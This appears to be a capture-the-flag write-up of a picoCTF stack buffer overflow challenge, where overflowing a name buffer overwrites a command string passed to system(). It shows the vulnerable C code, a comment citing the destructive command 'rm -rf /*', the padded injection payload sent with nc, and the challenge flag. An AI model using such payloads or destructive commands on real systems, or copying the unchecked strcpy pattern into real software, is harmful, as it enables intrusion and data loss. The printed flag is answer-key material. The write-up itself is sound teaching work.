# Input Injection 1

## Category
Binary Exploitation

## Difficulty
Medium

## Description
Buffer overflow where overwriting adjacent stack variables leads to arbitrary command execution.

## What fucked up
```c
void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];
    // Nothing check if `buffer` overflows
    strcpy(c, cmd);
    strcpy(buffer, name);  // <-- oops
    printf("Goodbye, %s!\n", buffer);
    system(c);  // run anything here `rm -rf /*`
}
```

**What can we do:**
```
[buffer: 10 bytes][c: 10 bytes][...]
```

Write more than 10 bytes to `buffer` and you overwrite `c`. Since `c` goes to `system()`, you can inject commands.

## Try:
Payload: `FUCKFUCKFUcat flag.txt` -> `cat flag.txt`

```bash
printf 'FUCKFUCKFUcat flag.txt' | nc amiable-citadel.picoctf.net 63675
```

**Result**:
```
Goodbye, FUCKFUCKFUcat flag.txt!
picoCTF{0v3rfl0w_c0mm4nd_22530a1b}
```